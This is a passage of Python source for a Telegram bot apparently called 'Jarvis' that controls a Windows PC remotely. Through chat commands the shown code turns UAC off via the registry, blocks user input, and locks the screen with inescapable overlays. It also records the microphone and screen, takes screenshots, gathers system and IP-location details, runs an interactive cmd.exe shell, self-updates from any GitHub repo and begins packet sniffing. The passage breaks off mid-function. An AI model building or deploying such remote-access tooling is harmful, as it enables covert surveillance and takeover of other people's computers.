    interface = devices.Activate(IAudioEndpointVolume._iid_, CLSCTX_ALL, None)
    volume = cast(interface, POINTER(IAudioEndpointVolume))
    volume.SetMasterVolumeLevelScalar(level / 100, None)
    return f"🔊 Volume set to {level}%"


async def handle_volume(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if not context.args:
        current = await asyncio.to_thread(get_current_volume)
        await update.message.reply_text(
            f"🔊 Current volume: {current}%\n"
            f"📌 Usage: /volume <0-100>\n"
        )
        return

    try:
        level = int(context.args[0])
        result = await asyncio.to_thread(set_volume, level)
        await update.message.reply_text(result)
    except ValueError:
        await update.message.reply_text("❌ Please enter a valid number between 0 and 100.")


app.add_handler(CommandHandler("volume", restricted_handler(log_command(handle_volume))))
#--END--



#--UACADMIN--
import win32com.shell.shell as shell

def is_admin():
    try:
        return ctypes.windll.shell32.IsUserAnAdmin()
    except Exception:
        return False

def is_uac_enabled():
    try:
        output = subprocess.check_output(
            'reg query HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\System /v EnableLUA',
            shell=True,
            text=True
        )
        return "0x1" in output or "0x00000001" in output
    except subprocess.CalledProcessError:
        return False


async def enableuac(update: Update, context: ContextTypes.DEFAULT_TYPE):
    await update.message.reply_text("🔧 Checking current UAC status...")
    
    if is_uac_enabled():
        await update.message.reply_text("✅ UAC is already enabled.")
        return

    if not is_admin():
        await update.message.reply_text("⛔ This command requires Administrator privileges.")
        return

    try:
        command = r'reg add HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System /v EnableLUA /t REG_DWORD /d 1 /f'
        shell.ShellExecuteEx(lpVerb='runas', lpFile='cmd.exe', lpParameters='/c ' + command)
        await update.message.reply_text("✅ UAC has been enabled. Please restart your computer.")
    except Exception as e:
        await update.message.reply_text(f"❌ Failed to enable UAC: {e}")


async def disableuac(update: Update, context: ContextTypes.DEFAULT_TYPE):
    await update.message.reply_text("🔧 Checking current UAC status...")

    if not is_uac_enabled():
        await update.message.reply_text("✅ UAC is already disabled.")
        return

    if not is_admin():
        await update.message.reply_text("⛔ This command requires Administrator privileges.")
        return

    try:
        cmd1 = r'reg delete HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System /v EnableLUA /f'
        cmd2 = r'reg add HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System /v EnableLUA /t REG_DWORD /d 0 /f'
        shell.ShellExecuteEx(lpVerb='runas', lpFile='cmd.exe', lpParameters='/c ' + cmd1)
        shell.ShellExecuteEx(lpVerb='runas', lpFile='cmd.exe', lpParameters='/c ' + cmd2)
        await update.message.reply_text("✅ UAC has been disabled. Please restart your computer.")
    except Exception as e:
        await update.message.reply_text(f"❌ Failed to disable UAC: {e}")

app.add_handler(CommandHandler("enableuac", restricted_handler(log_command(enableuac))))
app.add_handler(CommandHandler("disableuac", restricted_handler(log_command(disableuac))))
#--END--





#--RESTARTPC--
async def restart_pc(update: Update, context: ContextTypes.DEFAULT_TYPE):
    try:
        subprocess.run("shutdown /r /t 0", shell=True)
        await update.message.reply_text("🔄 Restarting PC...")
    except Exception as e:
        await update.message.reply_text(f"❌ Restart failed: {e}")

app.add_handler(CommandHandler("restartme", restricted_handler(log_command(restart_pc))))
#--END--


#--ADMIN--
def is_admin():
    try:
        return ctypes.windll.shell32.IsUserAnAdmin()
    except Exception:
        return False

async def check_admin(update: Update, context: ContextTypes.DEFAULT_TYPE):
    admin = is_admin()
    if admin:
        await update.message.reply_text("✅ Script is running with Administrator privileges.")
    else:
        await update.message.reply_text("❌ Script is NOT running as Administrator.")

app.add_handler(CommandHandler("isadmin", restricted_handler(log_command(check_admin))))
#--END--





#------------------STOP INPUT CODE-----------------
# === Globals ===
input_block_active = False
input_block_lock = threading.Lock()

def is_admin():
    try:
        return ctypes.windll.shell32.IsUserAnAdmin()
    except Exception as e:
        logging.error(f"is_admin check failed: {e}")
        return False

def block_input(state: bool):
    try:
        ctypes.windll.user32.BlockInput(state)
        logging.info(f"BlockInput called with state={state}")
    except Exception as e:
        logging.error(f"BlockInput failed: {e}")

def input_blocker():
    while True:
        time.sleep(0.1)
        with input_block_lock:
            if input_block_active:
                ctypes.windll.user32.BlockInput(True)
            else:
                ctypes.windll.user32.BlockInput(False)

threading.Thread(target=input_blocker, daemon=True).start()

async def handle_stop_inputs(update: Update, context: ContextTypes.DEFAULT_TYPE):
    global input_block_active

    if not is_admin():
        await update.message.reply_text("⚠️ Admin rights required to block input.")
        logging.warning(f"User {update.effective_user.id} tried to block input without admin rights.")
        return

    if len(context.args) != 1:
        await update.message.reply_text("❌ Usage: /stopinputs <minutes>\nExample: /stopinputs 0.1 = 6 seconds")
        logging.warning(f"User {update.effective_user.id} provided invalid arguments to /stopinputs: {context.args}")
        return

    try:
        minutes = float(context.args[0])
        seconds = minutes * 60

        with input_block_lock:
            input_block_active = True
        logging.info(f"User {update.effective_user.id} blocked input for {seconds:.0f} seconds.")

        await update.message.reply_text(f"🛑 Input is blocked for {seconds:.0f} seconds...")

        await asyncio.sleep(seconds)

        with input_block_lock:
            input_block_active = False

        await update.message.reply_text("✅ Input is now unblocked.")
        logging.info(f"User {update.effective_user.id} input unblock finished.")

    except Exception as e:
        with input_block_lock:
            input_block_active = False
        logging.error(f"Error in handle_stop_inputs: {e}")
        await update.message.reply_text(f"❌ Error: {e}")








#--SCREENLOCK--
# === Check if GUI is available (safe for background/headless) ===
def is_gui_available():
    if platform.system() == "Windows":
        return os.environ.get("SESSIONNAME", "").lower() == "console"
    elif platform.system() in ["Linux", "Darwin"]:
        return "DISPLAY" in os.environ
    return False

# === Global overlay process ===
overlay_process = None

# === Overlay window logic ===
def show_overlay(text="🔒 LOCKED"):
    if not is_gui_available():
        logging.warning("⚠️ GUI not available; skipping screen overlay.")
        return

    try:
        window = tk.Tk()
        window.attributes("-fullscreen", True)
        window.configure(bg="black")
        window.attributes("-topmost", True)
        window.protocol("WM_DELETE_WINDOW", lambda: None)
        window.bind("<Key>", lambda e: "break")
        window.bind("<Button>", lambda e: "break")

        label = tk.Label(window, text=text, fg="white", bg="black", font=("Arial", 40))
        label.pack(expand=True)
        window.mainloop()
    except Exception as e:
        logging.error(f"Overlay window error: {e}")

# === Control overlay process ===
def start_overlay(text="🔒 LOCKED"):
    global overlay_process
    if overlay_process is None or not overlay_process.is_alive():
        overlay_process = multiprocessing.Process(target=show_overlay, args=(text,))
        overlay_process.start()
    else:
        logging.info("Overlay already running.")

def stop_overlay():
    global overlay_process
    if overlay_process and overlay_process.is_alive():
        overlay_process.terminate()
        overlay_process = None
        logging.info("Overlay process stopped.")

# === Telegram command: /screenlock [duration_minutes] ===
async def screenlock(update: Update, context: ContextTypes.DEFAULT_TYPE):
    try:
        if not is_gui_available():
            await update.message.reply_text("⚠️ Cannot lock screen: GUI not available.")
            return

        lock_text = "🔒 LOCKED"
        start_overlay(lock_text)

        if context.args:
            duration = float(context.args[0]) * 60
            await update.message.reply_text(f"🔒 Screen locked for {duration:.0f} seconds...")
            await asyncio.sleep(duration)
            stop_overlay()
            await update.message.reply_text("🔓 Screen automatically unlocked.")
        else:
            await update.message.reply_text("🔒 Screen locked. Use /screenunlock to unlock manually.")
    except Exception as e:
        logging.exception("screenlock failed")
        await update.message.reply_text(f"❌ Failed to lock screen: {e}")

# === Telegram command: /screenunlock ===
async def screenunlock(update: Update, context: ContextTypes.DEFAULT_TYPE):
    try:
        if overlay_process and overlay_process.is_alive():
            stop_overlay()
            await update.message.reply_text("🔓 Screen unlocked.")
        else:
            await update.message.reply_text("ℹ️ Screen is already unlocked.")
    except Exception as e:
        logging.exception("screenunlock failed")
        await update.message.reply_text(f"❌ Failed to unlock screen: {e}")
#--END--





















#--GUI--
import os
import platform
import logging
import tkinter as tk
import multiprocessing
from telegram import Update
from telegram.ext import ContextTypes

# === Check if GUI is available (safe for background/headless) ===
def is_gui_available():
    if platform.system() == "Windows":
        return os.environ.get("SESSIONNAME", "").lower() == "console"
    elif platform.system() in ["Linux", "Darwin"]:
        return "DISPLAY" in os.environ
    return False

# === Global overlay process ===
overlay_process = None

# === GUI overlay logic ===
def show_overlay(text):
    if not is_gui_available():
        logging.warning("⚠️ GUI not available; skipping fullscreen overlay.")
        return

    try:
        window = tk.Tk()
        window.attributes("-fullscreen", True)
        window.configure(bg="black")
        window.attributes("-topmost", True)
        window.protocol("WM_DELETE_WINDOW", lambda: None)
        window.bind("<Key>", lambda e: "break")
        window.bind("<Button>", lambda e: "break")

        label = tk.Label(
            window, 
            text=text, 
            fg="white", 
            bg="black", 
            font=("Arial", 40), 
            wraplength=1000, 
            justify="center"
        )
        label.pack(expand=True)
        window.mainloop()
    except Exception as e:
        logging.error(f"Overlay failed: {e}")

# === Overlay process control ===
def start_overlay(text):
    global overlay_process
    if overlay_process is None or not overlay_process.is_alive():
        overlay_process = multiprocessing.Process(target=show_overlay, args=(text,))
        overlay_process.start()
    else:
        logging.info("Overlay already running.")

def stop_overlay():
    global overlay_process
    if overlay_process and overlay_process.is_alive():
        overlay_process.terminate()
        overlay_process = None

# === /gui command handler ===
async def open_gui(update: Update, context: ContextTypes.DEFAULT_TYPE):
    global overlay_process

    if not is_gui_available():
        await update.message.reply_text("⚠️ GUI is not available in this environment.")
        return

    if overlay_process and overlay_process.is_alive():
        await update.message.reply_text("🟢 Fullscreen GUI overlay is already running.")
        return

    # Get input text from args
    input_text = " ".join(context.args).strip() if context.args else ""

    if not input_text:
        await update.message.reply_text(
            "❗ Please provide the text to display on the GUI overlay."
        )
        return

    try:
        start_overlay(input_text)
        await update.message.reply_text(
            f"🟢 Fullscreen GUI overlay started with:\n\n`{input_text}`",
            parse_mode="Markdown"
        )
    except Exception as e:
        await update.message.reply_text(f"❌ Failed to start fullscreen GUI: {e}")

# === /closegui command handler ===
async def close_gui(update: Update, context: ContextTypes.DEFAULT_TYPE):
    global overlay_process
    try:
        if overlay_process and overlay_process.is_alive():
            stop_overlay()
            await update.message.reply_text("🔴 Fullscreen GUI overlay closed.")
        else:
            await update.message.reply_text("⚠️ Fullscreen GUI overlay is not running.")
    except Exception as e:
        await update.message.reply_text(f"❌ Failed to close fullscreen GUI: {e}")

app.add_handler(CommandHandler("gui", restricted_handler(log_command(open_gui))))
app.add_handler(CommandHandler("closegui", restricted_handler(log_command(close_gui))))
#--END--







#--STATUS--
def is_admin():
    try:
        return ctypes.windll.shell32.IsUserAnAdmin()
    except:
        return False
from telegram import Update
from telegram.ext import ContextTypes

async def handle_status(update: Update, context: ContextTypes.DEFAULT_TYPE):
    try:
        script_status = "🟢 Script is running."
        admin_status = "✅ Running as Administrator." if is_admin() else "⚠️ *Not* running as Administrator."

        response = f"""📊 *System Status:*

{script_status}
{admin_status}
"""
        await update.message.reply_text(response, parse_mode="Markdown")

    except Exception as e:
        await update.message.reply_text(f"❌ Failed to fetch status: {e}")
app.add_handler(CommandHandler("status", restricted_handler(log_command(handle_status))))
#--END--




























async def record_audio(update: Update, duration_seconds: float, filename="recorded_audio.wav"):
    await update.message.reply_text(f"🎙️ Recording started for {duration_seconds:.1f} seconds...")
    logging.info(f"Recording started for {duration_seconds:.1f} seconds...")

    recognizer = sr.Recognizer()

    try:
        with sr.Microphone() as source:
            recognizer.adjust_for_ambient_noise(source)
            audio = recognizer.record(source, duration=duration_seconds)

        with open(filename, "wb") as f:
            f.write(audio.get_wav_data())

        await update.message.reply_text(f"✅ Recording saved successfully as `{filename}`.", parse_mode="Markdown")
        logging.info(f"Recording saved: {filename}")
        return filename

    except Exception as e:
        logging.error(f"Error while recording audio: {e}")
        await update.message.reply_text("❌ Failed to record audio. Check if your microphone is connected and accessible.")
        return None

async def handle_record_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_command = update.message.text
    match = re.search(r'/record\s*([\d.]+)', user_command.lower())

    if match:
        try:
            minutes = float(match.group(1))
            seconds = minutes * 60
            audio_file = await record_audio(update, seconds)

            if audio_file:
                try:
                    with open(audio_file, 'rb') as audio:
                        await context.bot.send_audio(chat_id=update.effective_chat.id, audio=audio)

                    os.remove(audio_file)
                    logging.info(f"File deleted after sending: {audio_file}")
                    await update.message.reply_text("🗑️ File deleted after sending.")
                except Exception as e:
                    logging.error(f"Error sending or deleting file: {e}")
                    await update.message.reply_text(f"❌ There was an issue while sending or deleting the file: {e}")
        except ValueError:
            await update.message.reply_text("❌ Invalid format. Use something like `/record 0.5` for 30 seconds.")
            logging.warning(f"User {update.effective_user.id} provided invalid record format: {user_command}")
    else:
        await update.message.reply_text("❓ Please use `/record <minutes>` format. Example: `/record 1` or `/record 0.1`")
        logging.info(f"User {update.effective_user.id} used /record without valid duration.")

















async def take_screenshot(update: Update, context: ContextTypes.DEFAULT_TYPE):
    try:
        # Take screenshot
        screenshot = pyautogui.screenshot()

        # Save it to a byte stream
        byte_stream = io.BytesIO()
        screenshot.save(byte_stream, format="PNG")
        byte_stream.seek(0)  # Rewind the stream to the start

        # Send the screenshot to the user on Telegram
        await update.message.reply_text("📸 Here's your screenshot!")
        await update.message.reply_photo(photo=InputFile(byte_stream, filename="screenshot.png"))
    except Exception as e:
        await update.message.reply_text(f"❌ An error occurred while taking the screenshot: {e}")






async def get_weather(update: Update, context: ContextTypes.DEFAULT_TYPE):
    try:
        if not context.args:
            await update.message.reply_text("❌ Please provide a city name to get the weather.")
            return
        
        city_name = " ".join(context.args)
        url = f"{BASE_URL}?q={city_name}&appid={API_KEY}&units=metric"
        
        response = requests.get(url)
        data = response.json()
        
        if data["cod"] != 200:
            await update.message.reply_text(f"❌ Could not fetch weather data for {city_name}. Please check the city name.")
            return
        
        main = data["main"]
        weather = data["weather"][0]
        wind = data["wind"]
        clouds = data.get("clouds", {}).get("all", "N/A")
        visibility = data.get("visibility", 0) / 1000  # in KM
        sys = data["sys"]
        timezone_offset = data["timezone"]

        # Convert sunrise/sunset to local time
        local_tz = timezone.utc if timezone_offset == 0 else pytz.FixedOffset(timezone_offset // 60)
        sunrise = datetime.fromtimestamp(sys["sunrise"], tz=timezone.utc).astimezone(local_tz).strftime("%I:%M %p")
        sunset = datetime.fromtimestamp(sys["sunset"], tz=timezone.utc).astimezone(local_tz).strftime("%I:%M %p")

        weather_message = (
            f"🌍 Weather in {city_name}:\n"
            f"🌡️ Temperature: {main['temp']}°C (Feels like: {main['feels_like']}°C)\n"
            f"🌤️ Condition: {weather['description'].capitalize()}\n"
            f"💧 Humidity: {main['humidity']}%\n"
            f"🔼 Pressure: {main['pressure']} hPa\n"
            f"💨 Wind: {wind['speed']} m/s\n"
            f"👁️ Visibility: {visibility:.1f} km\n"
            f"☁️ Cloudiness: {clouds}%\n"
            f"🌅 Sunrise: {sunrise}\n"
            f"🌇 Sunset: {sunset}"
        )

        await update.message.reply_text(weather_message)

    except Exception as e:
        await update.message.reply_text(f"❌ An error occurred while fetching the weather: {str(e)}")








async def search_wikipedia(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """
    Wikipedia Search with:
    - Language support
    - Summary & image
    - Read more button
    - Google fallback if not found
    """

    if not context.args:
        await update.message.reply_text("📌 Usage: /wikipedia <topic> [lang_code]\nExample: /wikipedia Elon Musk en")
        return

    # Detect lang code
    lang_code = "en"
    if len(context.args[-1]) == 2:
        lang_code = context.args[-1].lower()
        query = " ".join(context.args[:-1])
    else:
        query = " ".join(context.args)

    wikipedia.set_lang(lang_code)
    query_title = query.title()  # Normalize

    try:
        await update.message.reply_text(f"🔍 Searching *{query}* in `{lang_code}` Wikipedia...", parse_mode="Markdown")

        page = wikipedia.page(query_title, auto_suggest=True)
        summary = page.summary[:1000]

        await update.message.reply_text(f"📄 *Summary:*\n{summary}", parse_mode="Markdown")

        # Try to send image
        for img_url in page.images:
            if img_url.lower().endswith((".jpg", ".jpeg", ".png")):
                await update.message.reply_photo(photo=img_url)
                break

        # Inline button for full article
        button = InlineKeyboardMarkup([
            [InlineKeyboardButton("🔗 Read Full Article", url=page.url)]
        ])
        await update.message.reply_text("📘 More Info:", reply_markup=button)

    except wikipedia.exceptions.DisambiguationError as e:
        await update.message.reply_text(
            f"❌ Too many results for *{query}*.\nTop suggestions:\n" +
            "\n".join(f"• {opt}" for opt in e.options[:5]), parse_mode="Markdown"
        )

    except wikipedia.exceptions.PageError:
        google_url = f"https://www.google.com/search?q={query.replace(' ', '+')}"
        button = InlineKeyboardMarkup([
            [InlineKeyboardButton("🔍 Search on Google", url=google_url)]
        ])
        await update.message.reply_text(
            f"❌ Wikipedia page not found for *{query}*.",
            parse_mode="Markdown",
            reply_markup=button
        )

    except Exception as e:
        await update.message.reply_text(f"❌ Error: {e}")












async def reboot_bot(update: Update, context: ContextTypes.DEFAULT_TYPE):
    command = update.message.text.lower()
    
    if command == "/reboot" or command == "/restart":
        await update.message.reply_text("♻️ Rebooting Jarvis...")

        # Kill the current bot process and then start a new one
        python = sys.executable  # Get the Python executable
        script = os.path.abspath(sys.argv[0])  # Get the current script

        # Start a new process to run the bot
        subprocess.Popen([python, script])

        # Exit current process
        os._exit(0)   








    





#--RECORDING--
import os
import asyncio
import cv2
import numpy as np
import mss
from telegram import Update
from telegram.ext import ContextTypes, CommandHandler

recording_filename = "screen_recording.mp4"

# /recordscreen <minutes>
async def record_screen_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if not context.args:
        await update.message.reply_text("❌ Usage: /recordscreen <time_in_minutes>")
        return

    try:
        minutes = float(context.args[0])
        seconds = minutes * 60
        await update.message.reply_text(f"🎥 Recording screen for {minutes} minutes...")

        await record_screen(seconds)

        if os.path.exists(recording_filename):
            await update.message.reply_text("📤 Sending the recorded video...")
            try:
                with open(recording_filename, "rb") as f:
                    await update.message.reply_video(f)

                await update.message.reply_text(
                    "✅ Recording sent successfully.\n"
                    "📌 Type /deleterecord to delete it from the system."
                )
            except Exception as e:
                if "timed out" in str(e).lower():
                    await update.message.reply_text(
                        "✅ Recording likely sent, but response timed out.\n"
                        "📌 Type /deleterecord to delete it from the system."
                    )
                else:
                    await update.message.reply_text(f"❌ Error sending video: {e}")
        else:
            await update.message.reply_text("❌ Recording file not found.")
    except Exception as e:
        await update.message.reply_text(f"❌ Error: {e}")

# Recording function
async def record_screen(duration: float):
    with mss.mss() as sct:
        monitor = sct.monitors[1] if len(sct.monitors) > 1 else sct.monitors[0]
        width, height = monitor["width"], monitor["height"]
        out = cv2.VideoWriter(recording_filename, cv2.VideoWriter_fourcc(*"mp4v"), 10.0, (width, height))
        start = asyncio.get_event_loop().time()

        while asyncio.get_event_loop().time() - start < duration:
            img = np.array(sct.grab(monitor))
            frame = cv2.cvtColor(img, cv2.COLOR_BGRA2BGR)
            out.write(frame)
            await asyncio.sleep(0.1)

        out.release()

# /deleterecord command
async def deleterecord(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if os.path.exists(recording_filename):
        os.remove(recording_filename)
        await update.message.reply_text("✅ Recording deleted successfully.")
    else:
        await update.message.reply_text("❌ No recording file found to delete.")


app.add_handler(CommandHandler("screenrecord", restricted_handler(log_command(record_screen_handler))))
app.add_handler(CommandHandler("deleterecord", restricted_handler(log_command(deleterecord))))
#--END--















async def get_system_info(update: Update, context: ContextTypes.DEFAULT_TYPE):
    try:
        uname = platform.uname()
        cpu_count = psutil.cpu_count(logical=True)
        memory = psutil.virtual_memory()
        swap = psutil.swap_memory()
        boot_time = datetime.fromtimestamp(psutil.boot_time()).strftime("%Y-%m-%d %I:%M:%S %p")
        uptime = str(datetime.now() - datetime.fromtimestamp(psutil.boot_time())).split('.')[0]

        cpu_freq = psutil.cpu_freq()
        cpu_percent = psutil.cpu_percent(interval=1, percpu=True)
        total_cpu = psutil.cpu_percent()

        disk_info = ""
        for part in psutil.disk_partitions():
            try:
                usage = psutil.disk_usage(part.mountpoint)
                disk_info += f"📁 {part.device} ({part.mountpoint}): {usage.used / (1024 ** 3):.2f} GB used / {usage.total / (1024 ** 3):.2f} GB total\n"
            except:
                continue

        hostname = socket.gethostname()
        ip_address = socket.gethostbyname(hostname)

        gpus = GPUtil.getGPUs()
        gpu_info = "🚫 No GPU Detected"
        if gpus:
            gpu_info = ""
            for gpu in gpus:
                gpu_info += f"🎮 {gpu.name} | Load: {gpu.load * 100:.1f}% | Mem: {gpu.memoryUsed:.1f}/{gpu.memoryTotal:.1f}MB\n"

        users = [u.name for u in psutil.users()]
        current_user = getpass.getuser()

        battery = psutil.sensors_battery()
        battery_info = "🔋 Not Available"
        if battery:
            battery_info = f"{battery.percent}% {'(⚡ Charging)' if battery.power_plugged else '(🔌 Not Charging)'}"

        system_info = f"""🤖 *System Report*

🖥️ *System:*
• OS: {uname.system} {uname.release}
• Node: {uname.node}
• Machine: {uname.machine}
• Processor: {uname.processor}
• CPU Cores: {cpu_count}
• Frequency: {cpu_freq.current:.2f} MHz
• CPU Usage: {total_cpu}% (Per Core: {', '.join(f'{x}%' for x in cpu_percent)})
• Boot Time: {boot_time}
• Uptime: {uptime}

💾 *Memory:*
• RAM: {memory.used / (1024**3):.2f} / {memory.total / (1024**3):.2f} GB used
• Swap: {swap.used / (1024**3):.2f} / {swap.total / (1024**3):.2f} GB

🗂️ *Disks:*
{disk_info.strip()}

🌐 *Network:*
• Hostname: {hostname}
• IP: {ip_address}

🎮 *GPU:*
{gpu_info.strip()}

👤 *Users:*
• Current: {current_user}
• Active: {', '.join(set(users))}

🔋 *Battery:*
{battery_info}
"""

        await update.message.reply_text(system_info, parse_mode="Markdown")

    except Exception as e:
        await update.message.reply_text(f"❌ Error fetching system info:\n`{e}`", parse_mode="Markdown")





async def get_public_ip():
    async with aiohttp.ClientSession() as session:
        async with session.get("https://api.ipify.org?format=json") as resp:
            data = await resp.json()
            return data["ip"]

async def get_ip_location(ip):
    async with aiohttp.ClientSession() as session:
        async with session.get(f"https://ipinfo.io/{ip}/json") as resp:
            data = await resp.json()
            city = data.get("city", "Unknown")
            region = data.get("region", "Unknown")
            country = data.get("country", "Unknown")
            org = data.get("org", "Unknown")
            return f"{city}, {region}, {country} ({org})"

# Run blocking function (psutil) in a background thread
async def get_all_local_ips():
    return await asyncio.to_thread(psutil.net_if_addrs)

# Telegram command handler
async def get_ip_info(update: Update, context: ContextTypes.DEFAULT_TYPE):
    try:
        # Get local IPs in a non-blocking manner
        local_ips_data = await get_all_local_ips()
        local_ips = []
        for interface, addrs in local_ips_data.items():
            for addr in addrs:
                if addr.family == socket.AF_INET and not addr.address.startswith("127."):
                    local_ips.append(f"{interface}: {addr.address}")

        # Get public IP and location
        public_ip = await get_public_ip()
        location = await get_ip_location(public_ip)

        # Format message with IP information
        message = "🌐 *IP Information*\n\n"
        message += "📶 *Local IPs:*\n"
        for ip in local_ips:
            message += f"• `{ip}`\n"

        message += f"\n🛰️ *Public IP:* `{public_ip}`\n"
        message += f"📍 *Location:* {location}"

        await update.message.reply_text(message, parse_mode="Markdown")

    except Exception as e:
        await update.message.reply_text(f"❌ Error fetching IP info:\n`{e}`", parse_mode="Markdown")











def get_state(context):
    return context.user_data.setdefault("state", {
        "cmd_mode": False,
        "process": None,
        "note_state": None,
        "file_name": None
    })



async def execute_cmd_command(cmd, process):
    try:
        if process.stdin is None or process.stdout is None:
            return "❌ Process is not ready."

        process.stdin.write(cmd.encode() + b"\n")
        await process.stdin.drain()

        output = b""
        for _ in range(50):  # Limit to prevent infinite loops
            try:
                line = await asyncio.wait_for(process.stdout.readline(), timeout=1)
                if not line or line.strip().endswith(b'>'):  # crude CMD prompt check
                    break
                output += line
            except asyncio.TimeoutError:
                break

        decoded = output.decode(errors="ignore").strip()
        return decoded if decoded else "✅ Command executed with no output."

    except Exception as e:
        return f"❌ Exception: {e}"


async def open_cmd_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
    state = get_state(context)
    if state["cmd_mode"]:
        return await update.message.reply_text("⚠️ CMD mode already active.")

    state["process"] = await asyncio.create_subprocess_exec(
        "cmd.exe", stdin=asyncio.subprocess.PIPE,
        stdout=asyncio.subprocess.PIPE,
        stderr=asyncio.subprocess.STDOUT
    )
    state["cmd_mode"] = True

    await update.message.reply_text(
        "✅ CMD opened. You may now enter commands.\n"
        "(ℹ️ Type `/exitcmd` to leave CMD mode.)"
    )


async def clear_cmd_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
    state = context.user_data.setdefault("state", {
        "cmd_mode": False,
        "process": None,
        "note_state": None,
        "file_name": None
    })

    if not state["cmd_mode"]:
        await update.message.reply_text("⚠️ CMD mode is not active. Use /opencmd to start.")
        return

    process = state.get("process")
    if process and process.returncode is None:
        process.kill()
        try:
            await process.wait()
        except:
            pass

    # Restart new CMD process
    state["process"] = await asyncio.create_subprocess_exec(
        "cmd.exe",
        stdin=asyncio.subprocess.PIPE,
        stdout=asyncio.subprocess.PIPE,
        stderr=asyncio.subprocess.STDOUT
    )

    await update.message.reply_text("🧹 CMD session cleared. You can continue entering commands.")



async def handle_all_text(update: Update, context: ContextTypes.DEFAULT_TYPE):
    state = get_state(context)
    text = update.message.text.strip()

    # —— CMD Mode —— #
    if state["cmd_mode"]:
        if text.lower() in ["/exitcmd", "exit", "stop cmd"]:
            proc = state["process"]
            if proc:
                proc.kill()
                await proc.wait()
            state["cmd_mode"] = False
            state["process"] = None
            return await update.message.reply_text("🚪 Exited CMD mode.")
        else:
            output = await execute_cmd_command(text, state["process"])
            return await update.message.reply_text(f"📤 Output:\n{output}")

    # —— Note Creation Mode —— #
    if state["note_state"] == "awaiting_filename":
        fn = text if text.endswith(".txt") else text + ".txt"
        state["file_name"] = fn
        state["note_state"] = "awaiting_content"
        return await update.message.reply_text(
            f"✅ File name set as *{fn}*.\nNow send the *note content*.",
            parse_mode="Markdown"
        )

    if state["note_state"] == "awaiting_content":
        save_note_to_file(text, state["file_name"])
        state["note_state"] = None
        fn = state["file_name"]
        state["file_name"] = None
        return await update.message.reply_text(
            f"✅ Your note has been saved to *{fn}*.",
            parse_mode="Markdown"
        )



#--EXITEXE--
def is_admin():
    try:
        return ctypes.windll.shell32.IsUserAnAdmin()
    except Exception as e:
        print(f"Admin check error: {e}")
        return False

async def exit_exe(update: Update, context: ContextTypes.DEFAULT_TYPE):
    exe_name = os.path.basename(sys.argv[0])
    exe_ext = os.path.splitext(exe_name)[1]

    if exe_ext.lower() != '.exe':
        await update.message.reply_text("This command is for EXE files only.")
        return

    if not is_admin():
        await update.message.reply_text("Admin privileges required to run this command.")
        return

    try:
        # First send confirmation to Telegram
        await update.message.reply_text(f"Attempting to forcefully terminate {exe_name}...")

        # Then kill the process
        cmd = ["taskkill", "/F", "/IM", exe_name]
        await asyncio.to_thread(subprocess.run, cmd, capture_output=True, text=True, shell=True)

    except Exception as e:
        await update.message.reply_text(f"Error occurred: {e}")
        print(f"taskkill error: {e}")


app.add_handler(CommandHandler("exitexe", restricted_handler(log_command(exit_exe))))
#--END--



#--EXITEXE--
async def exit_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
    command = update.message.text.lower()

    if command == "/exitscript":
        shutdown_message = "🛑 Jarvis is shutting down... Goodbye!"
        await update.message.reply_text(shutdown_message)
        logging.info(shutdown_message)

        # Stop polling first
        await context.application.stop()
        logging.info("Application polling stopped.")

        # Then shutdown the application
        await context.application.shutdown()
        logging.info("Application shutdown complete.")

        # Allow time for tasks to gracefully complete
        await asyncio.sleep(1)

        # Exit the script
        logging.info("Exiting the script now.")
        sys.exit(0)

app.add_handler(CommandHandler("exitscript", restricted_handler(log_command(exit_handler))))
#--END--






#--UPDATE--
from telegram import Update
from telegram.ext import ContextTypes
import os
import subprocess
import sys
from pathlib import Path
import shutil
import ctypes
import stat

# Windows-specific: handle read-only file removal
def handle_remove_readonly(func, path, exc):
    os.chmod(path, stat.S_IWRITE)
    func(path)

#--UPDATE--
async def update_jarvis(update: Update, context: ContextTypes.DEFAULT_TYPE):
    try:
        # 🔐 Check admin rights
        if not ctypes.windll.shell32.IsUserAnAdmin():
            await update.message.reply_text("❌ Admin privileges required to perform update.\nPlease run this script as administrator.")
            return

        if not context.args:
            await update.message.reply_text(
                "⚠️ Please provide a GitHub repository URL.\nUsage: `/update <repo_url>`",
                parse_mode="Markdown"
            )
            return

        repo_url = context.args[0]

        # ✅ Validate GitHub repo URL
        if not repo_url.startswith("https://github.com/") or not repo_url.endswith(".git"):
            await update.message.reply_text(
                "❌ Invalid URL. Must be a GitHub repository URL ending in `.git`\nExample:\n`https://github.com/user/repo.git`",
                parse_mode="Markdown"
            )
            return

        await update.message.reply_text("⏳ Cloning the repository...")

        tmp_dir = Path("tmp_update_dir")
        current_script = Path(__file__).name

        # 🧹 Clean up previous temp folder if it exists
        if tmp_dir.exists():
            shutil.rmtree(tmp_dir, onerror=handle_remove_readonly)

        # 📥 Clone repo
        subprocess.run(["git", "clone", repo_url, str(tmp_dir)], check=True)

        # 🔄 Replace current script with updated one
        new_file_path = tmp_dir / current_script
        if not new_file_path.exists():
            await update.message.reply_text(
                f"❌ `{current_script}` not found in the repo root. Please check the repository.",
                parse_mode="Markdown"
            )
            shutil.rmtree(tmp_dir, onerror=handle_remove_readonly)
            return

        with open(current_script, 'wb') as dest_file, open(new_file_path, 'rb') as src_file:
            dest_file.write(src_file.read())

        await update.message.reply_text("✅ Update successful from GitHub!\n♻️ Restarting Jarvis...")

        shutil.rmtree(tmp_dir, onerror=handle_remove_readonly)

        os.execv(sys.executable, ['python'] + sys.argv)

    except subprocess.CalledProcessError as e:
        await update.message.reply_text(f"❌ Git error:\n`{e}`", parse_mode="Markdown")
    except Exception as e:
        await update.message.reply_text(f"⚠️ Update failed:\n`{e}`", parse_mode="Markdown")

app.add_handler(CommandHandler("update", restricted_handler(log_command(update_jarvis))))
#--END--









#--SNIFF--
def sniff_packets(duration, chat_id, bot, loop):
    logging.info(f"Sniffing packets for {duration} seconds...")
